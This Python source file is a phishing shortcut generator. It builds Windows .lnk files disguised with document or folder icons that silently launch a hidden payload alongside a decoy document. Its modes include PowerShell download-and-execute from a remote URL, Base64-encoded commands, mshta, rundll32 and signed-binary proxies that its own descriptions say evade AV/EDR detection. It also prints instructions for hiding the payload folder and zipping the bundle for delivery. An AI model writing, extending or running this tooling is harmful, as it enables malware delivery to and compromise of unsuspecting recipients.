import os
import subprocess
import tempfile
import random
import string
import base64
from config import OUTPUT_DIR


# ============================================================
# Icon Configuration — uses only icons guaranteed on Windows
# ============================================================
ICON_CONFIG = {
    "PDF Document": {
        "options": [
            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 122, "label": "PDF Icon (imageres.dll)"},
            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 1, "label": "Generic Document Icon (shell32.dll)"},
        ]
    },
    "Word Document": {
        "options": [
            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 122, "label": "Document Icon (imageres.dll)"},
            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 1, "label": "Generic Document Icon (shell32.dll)"},
        ]
    },
    "Excel Document": {
        "options": [
            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 123, "label": "Spreadsheet Icon (imageres.dll)"},
            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 1, "label": "Generic Document Icon (shell32.dll)"},
        ]
    },
    "Folder": {
        "options": [
            {"path": "C:\\Windows\\System32\\shell32.dll", "index": 3, "label": "Folder Icon"},
            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 3, "label": "Folder Icon 2"},
        ]
    },
    "Image File": {
        "options": [
            {"path": "C:\\Windows\\System32\\imageres.dll", "index": 67, "label": "Image Icon"},
        ]
    },
}


# ============================================================
# LNK File Generation — three-level fallback
# win32com -> PowerShell -> VBScript
# ============================================================

def create_lnk_file(output_path, target_path, arguments="", icon_path="",
                     icon_index=0, description="", working_dir="", window_style=7):
    """
    Generate an LNK shortcut file.
    Tries in order: win32com -> PowerShell -> VBScript
    Returns: (success: bool, message: str)
    """
    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    # Method 1: win32com
    try:
        return _create_lnk_win32com(
            output_path, target_path, arguments, icon_path,
            icon_index, description, working_dir, window_style
        )
    except Exception:
        pass

    # Method 2: PowerShell
    try:
        return _create_lnk_powershell(
            output_path, target_path, arguments, icon_path,
            icon_index, description, working_dir, window_style
        )
    except Exception:
        pass

    # Method 3: VBScript
    try:
        return _create_lnk_vbscript(
            output_path, target_path, arguments, icon_path,
            icon_index, description, working_dir, window_style
        )
    except Exception as e:
        return False, f"All LNK generation methods failed: {str(e)}"


def _create_lnk_win32com(output_path, target_path, arguments, icon_path,
                          icon_index, description, working_dir, window_style):
    import win32com.client
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(output_path)
    shortcut.TargetPath = target_path
    shortcut.Arguments = arguments
    shortcut.Description = description
    shortcut.WindowStyle = window_style
    if working_dir:
        shortcut.WorkingDirectory = working_dir
    if icon_path:
        shortcut.IconLocation = f"{icon_path},{icon_index}"
    shortcut.save()
    return True, f"LNK file generated (win32com): {output_path}"


def _create_lnk_powershell(output_path, target_path, arguments, icon_path,
                            icon_index, description, working_dir, window_style):
    def escape_ps(s):
        return s.replace("'", "''")

    ps_script = f'''
$ws = New-Object -ComObject WScript.Shell
$s = $ws.CreateShortcut('{escape_ps(output_path)}')
$s.TargetPath = '{escape_ps(target_path)}'
$s.Arguments = '{escape_ps(arguments)}'
$s.Description = '{escape_ps(description)}'
$s.WindowStyle = {window_style}
'''
    if working_dir:
        ps_script += f"$s.WorkingDirectory = '{escape_ps(working_dir)}'\n"
    if icon_path:
        ps_script += f"$s.IconLocation = '{escape_ps(icon_path)},{icon_index}'\n"
    ps_script += "$s.Save()\n"

    result = subprocess.run(
        ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
        capture_output=True, text=True, timeout=15
    )
    if result.returncode != 0:
        raise Exception(f"PowerShell error: {result.stderr}")
    if os.path.exists(output_path):
        return True, f"LNK file generated (PowerShell): {output_path}"
    raise Exception("PowerShell completed but file was not created")


def _create_lnk_vbscript(output_path, target_path, arguments, icon_path,
                          icon_index, description, working_dir, window_style):
    def escape_vbs(s):
        return s.replace('"', '""')

    vbs_content = f'''
Set ws = WScript.CreateObject("WScript.Shell")
Set sc = ws.CreateShortcut("{escape_vbs(output_path)}")
sc.TargetPath = "{escape_vbs(target_path)}"
sc.Arguments = "{escape_vbs(arguments)}"
sc.Description = "{escape_vbs(description)}"
sc.WindowStyle = {window_style}
'''
    if working_dir:
        vbs_content += f'sc.WorkingDirectory = "{escape_vbs(working_dir)}"\n'
    if icon_path:
        vbs_content += f'sc.IconLocation = "{escape_vbs(icon_path)},{icon_index}"\n'
    vbs_content += "sc.Save\n"

    vbs_path = os.path.join(tempfile.gettempdir(), f"_lnk_gen_{os.getpid()}.vbs")
    try:
        with open(vbs_path, 'w') as f:
            f.write(vbs_content)
        result = subprocess.run(
            ["cscript", "//Nologo", vbs_path],
            capture_output=True, text=True, timeout=15
        )
        if result.returncode != 0:
            raise Exception(f"VBScript error: {result.stderr}")
        if os.path.exists(output_path):
            return True, f"LNK file generated (VBScript): {output_path}"
        raise Exception("VBScript completed but file was not created")
    finally:
        try:
            os.remove(vbs_path)
        except OSError:
            pass


# ============================================================
# Execution Mode Templates
# ============================================================

def _random_str(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def build_explorer_open(payload_relative_path, decoy_relative_path=""):
    """Explorer open — most natural, suitable for EXE"""
    target = "C:\\Windows\\explorer.exe"
    arguments = payload_relative_path

    if decoy_relative_path:
        target = "C:\\Windows\\System32\\cmd.exe"
        arguments = f'/c start "" "{payload_relative_path}" & start "" "{decoy_relative_path}"'

    return target, arguments


def build_direct_target(payload_relative_path, decoy_relative_path=""):
    """Direct target — cleanest process chain"""
    target = payload_relative_path
    arguments = ""
    return target, arguments


def build_powershell_relative(ps_script_relative_path, decoy_relative_path=""):
    """PowerShell script execution — for .ps1 files"""
    target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    arguments = f'-nop -w hidden -ep bypass -f "{ps_script_relative_path}"'
    if decoy_relative_path:
        arguments += f';Start-Process "{decoy_relative_path}"'
    return target, arguments


def build_mshta_relative(hta_relative_path, decoy_relative_path=""):
    """MSHTA execution — for .hta files"""
    target = "C:\\Windows\\System32\\mshta.exe"
    arguments = hta_relative_path
    if decoy_relative_path:
        target = "C:\\Windows\\System32\\cmd.exe"
        arguments = f'/c start "" mshta.exe "{hta_relative_path}" & start "" "{decoy_relative_path}"'
    return target, arguments


def build_wscript_relative(vbs_relative_path, decoy_relative_path=""):
    """WScript execution — for .vbs/.js files"""
    target = "C:\\Windows\\System32\\wscript.exe"
    arguments = vbs_relative_path
    if decoy_relative_path:
        target = "C:\\Windows\\System32\\cmd.exe"
        arguments = f'/c start "" wscript.exe "{vbs_relative_path}" & start "" "{decoy_relative_path}"'
    return target, arguments


def build_rundll32_dll(dll_relative_path, export_function="DllMain", decoy_relative_path=""):
    """Rundll32 DLL loading — DLL files only"""
    target = "C:\\Windows\\System32\\rundll32.exe"
    arguments = f'"{dll_relative_path}",{export_function}'
    if decoy_relative_path:
        target = "C:\\Windows\\System32\\cmd.exe"
        arguments = (
            f'/c start "" rundll32.exe "{dll_relative_path}",{export_function} '
            f'& start "" "{decoy_relative_path}"'
        )
    return target, arguments


def build_powershell_download_exec(download_url, download_filename="update.exe", decoy_relative_path=""):
    """PowerShell remote download"""
    target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    temp_file = f'$env:TEMP\\{download_filename}'
    arguments = (
        f'-nop -w hidden -ep bypass -c '
        f'"(New-Object Net.WebClient).DownloadFile(\'{download_url}\',\'{temp_file}\');'
        f'Start-Process \'{temp_file}\'"'
    )
    if decoy_relative_path:
        arguments = arguments.rstrip('"') + f';Start-Process \\"{decoy_relative_path}\\"\"'
    return target, arguments


def build_powershell_base64_cmd(command, decoy_relative_path=""):
    """PowerShell Base64-encoded command"""
    target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    full_command = command
    if decoy_relative_path:
        full_command += f';Start-Process "{decoy_relative_path}"'
    encoded = base64.b64encode(full_command.encode('utf-16-le')).decode()
    arguments = f'-nop -w hidden -ep bypass -EncodedCommand {encoded}'
    return target, arguments


def build_conhost_exec(payload_relative_path, decoy_relative_path=""):
    """Conhost proxy execution — less monitored than cmd.exe"""
    target = "C:\\Windows\\System32\\conhost.exe"
    if decoy_relative_path:
        arguments = f'cmd.exe /c start "" "{payload_relative_path}" & start "" "{decoy_relative_path}"'
    else:
        arguments = f'cmd.exe /c start "" "{payload_relative_path}"'
    return target, arguments


def build_pcalua_exec(payload_relative_path, decoy_relative_path=""):
    """Pcalua proxy execution — Microsoft-signed LOLBin, bypasses cmd"""
    target = "C:\\Windows\\System32\\pcalua.exe"
    arguments = f'-a "{payload_relative_path}"'
    # pcalua does not support opening a second file simultaneously
    return target, arguments


def build_syncappv_exec(powershell_command, decoy_relative_path=""):
    """SyncAppvPublishingServer execution — leverages App-V to run PS"""
    target = "C:\\Windows\\System32\\SyncAppvPublishingServer.exe"
    full_cmd = powershell_command
    if decoy_relative_path:
        full_cmd += f';Start-Process "{decoy_relative_path}"'
    arguments = f'"n; {full_cmd}"'
    return target, arguments


# ============================================================
# Main Generation Function
# ============================================================

def generate_lnk(
    execution_mode,
    command_or_url,
    icon_type,
    output_filename,
    payload_relative_path="",
    decoy_relative_path="",
    description="",
    dll_export_function="DllMain",
    download_filename="update.exe",
):
    """
    Generate an LNK shortcut file.
    Returns: (success: bool, message: str)
    """
    try:
        # 1. Build target + arguments
        if execution_mode == "Explorer Open":
            target, arguments = build_explorer_open(payload_relative_path, decoy_relative_path)

        elif execution_mode == "Direct Target":
            target, arguments = build_direct_target(payload_relative_path, decoy_relative_path)

        elif execution_mode == "PowerShell Script":
            target, arguments = build_powershell_relative(payload_relative_path, decoy_relative_path)

        elif execution_mode == "MSHTA Execute HTA":
            target, arguments = build_mshta_relative(payload_relative_path, decoy_relative_path)

        elif execution_mode == "WScript Execute VBS":
            target, arguments = build_wscript_relative(payload_relative_path, decoy_relative_path)

        elif execution_mode == "Rundll32 Load DLL":
            target, arguments = build_rundll32_dll(
                payload_relative_path, dll_export_function, decoy_relative_path
            )

        elif execution_mode == "PowerShell Remote Download":
            target, arguments = build_powershell_download_exec(
                command_or_url, download_filename, decoy_relative_path
            )

        elif execution_mode == "PowerShell Base64 Command":
            target, arguments = build_powershell_base64_cmd(command_or_url, decoy_relative_path)

        elif execution_mode == "Conhost Proxy":
            target, arguments = build_conhost_exec(payload_relative_path, decoy_relative_path)

        elif execution_mode == "Pcalua Proxy":
            target, arguments = build_pcalua_exec(payload_relative_path, decoy_relative_path)

        elif execution_mode == "SyncAppvPublishingServer":
            target, arguments = build_syncappv_exec(command_or_url, decoy_relative_path)

        else:
            return False, f"Unknown execution mode: {execution_mode}"

        # 2. Icon
        icon_path = ""
        icon_index = 0
        if icon_type in ICON_CONFIG:
            first_opt = ICON_CONFIG[icon_type]["options"][0]
            icon_path = first_opt["path"]
            icon_index = first_opt["index"]

        # 3. Generate LNK file
        if not output_filename.endswith(".lnk"):
            output_filename += ".lnk"

        output_path = os.path.join(OUTPUT_DIR, output_filename)

        success, gen_message = create_lnk_file(
            output_path=output_path,
            target_path=target,
            arguments=arguments,
            icon_path=icon_path,
            icon_index=icon_index,
            description=description or "Document",
            working_dir="",
            window_style=7,
        )

        if not success:
            return False, gen_message

        # 4. Phishing directory structure guide
        is_local = not is_remote_mode(execution_mode)

        guide_lines = [f"LNK file generated: {os.path.abspath(output_path)}\n"]

        if is_local:
            folder_name = output_filename.replace('.lnk', '')
            if '.' in folder_name:
                folder_name = folder_name.rsplit('.', 1)[0]

            guide_lines.append("Organize phishing files with the following directory structure:")
            guide_lines.append("")
            guide_lines.append(f"  {folder_name}/")
            guide_lines.append(f"  ├── {output_filename}  ← LNK (what the user sees and double-clicks)")
            guide_lines.append(f"  └── data/  ← hidden directory")

            if payload_relative_path:
                payload_name = payload_relative_path.replace('\\', '/').split('/')[-1]
                guide_lines.append(f"      ├── {payload_name}  ← your payload")

            if decoy_relative_path:
                decoy_name = decoy_relative_path.replace('\\', '/').split('/')[-1]
                guide_lines.append(f"      └── {decoy_name}  ← decoy document")

            guide_lines.append("")
            guide_lines.append("Hide directory: attrib +h +s data")
            guide_lines.append(f"Package for delivery: compress {folder_name}/ into ZIP/RAR")

        return True, '\n'.join(guide_lines)

    except Exception as e:
        return False, f"Failed to generate LNK: {str(e)}"


# ============================================================
# Helper Query Functions
# ============================================================

def get_execution_modes():
    """Return execution mode list (with group separators)"""
    return [
        "--- Direct Execution (EXE) ---",
        "Explorer Open",
        "Direct Target",
        "--- Script Execution ---",
        "PowerShell Script",
        "MSHTA Execute HTA",
        "WScript Execute VBS",
        "Rundll32 Load DLL",
        "--- Remote Download ---",
        "PowerShell Remote Download",
        "PowerShell Base64 Command",
        "--- Advanced Evasion (bypass cmd) ---",
        "Conhost Proxy",
        "Pcalua Proxy",
        "SyncAppvPublishingServer",
    ]


def get_icon_types():
    return list(ICON_CONFIG.keys())


def get_mode_description(mode):
    descriptions = {
        "Explorer Open":
            "Use explorer.exe to open the payload. The most natural execution method for EXE files.\n"
            "Payload path should be relative, e.g.: data\\payload.exe\n"
            "✅ Single file mode does not go through cmd.exe",
        "Direct Target":
            "LNK points directly to the payload file path; Windows executes based on file type.\n"
            "Cleanest process chain, but target path is visible in LNK properties.\n"
            "Payload path should be relative, e.g.: data\\payload.exe",
        "PowerShell Script":
            "Use PowerShell to execute a .ps1 script in the hidden directory.\n"
            "Payload path should point to the script, e.g.: data\\script.ps1",
        "MSHTA Execute HTA":
            "Use mshta.exe to execute an .hta file in the hidden directory.\n"
            "Payload path should point to the HTA, e.g.: data\\payload.hta",
        "WScript Execute VBS":
            "Use wscript.exe to execute a .vbs script in the hidden directory.\n"
            "Payload path should point to the VBS, e.g.: data\\script.vbs",
        "Rundll32 Load DLL":
            "Use rundll32.exe to load a DLL file (commonly used by APT28/Fancy Bear).\n"
            "⚠️ Only works with DLLs, not EXEs!\n"
            "DLL must export the specified function (default: DllMain).\n"
            "Payload path should be relative, e.g.: data\\payload.dll",
        "PowerShell Remote Download":
            "Use PowerShell to download and execute from a remote URL (no local payload needed).\n"
            "Enter the remote file URL in the Command/URL field.",
        "PowerShell Base64 Command":
            "Base64-encode a PowerShell command for execution, bypassing command-line keyword detection.\n"
            "Enter the PowerShell command in the Command/URL field.",
        "Conhost Proxy":
            "Use conhost.exe instead of cmd.exe to execute commands.\n"
            "conhost is the console host process; some AV/EDR monitor it less strictly.\n"
            "✅ Can evade some cmd.exe-specific detection rules\n"
            "Works with EXE files.",
        "Pcalua Proxy":
            "Use pcalua.exe (Program Compatibility Assistant) as a proxy launcher.\n"
            "Microsoft-signed LOLBin that can launch any EXE.\n"
            "✅ Does not go through cmd.exe; process chain: pcalua.exe -> payload.exe\n"
            "Works with EXE files.",
        "SyncAppvPublishingServer":
            "Leverage App-V component SyncAppvPublishingServer.exe to run PowerShell commands.\n"
            "Microsoft-signed binary; many EDRs do not monitor this process.\n"
            "✅ Does not directly invoke powershell.exe\n"
            "Enter the PowerShell command in the Command/URL field.",
    }
    return descriptions.get(mode, "")


def is_remote_mode(mode):
    """Check if the mode is remote/command-based (no local payload path needed)"""
    return mode in [
        "PowerShell Remote Download",
        "PowerShell Base64 Command",
        "SyncAppvPublishingServer",
    ]


def is_separator(mode):
    """Check if the entry is a separator line"""
    return mode.startswith("---")
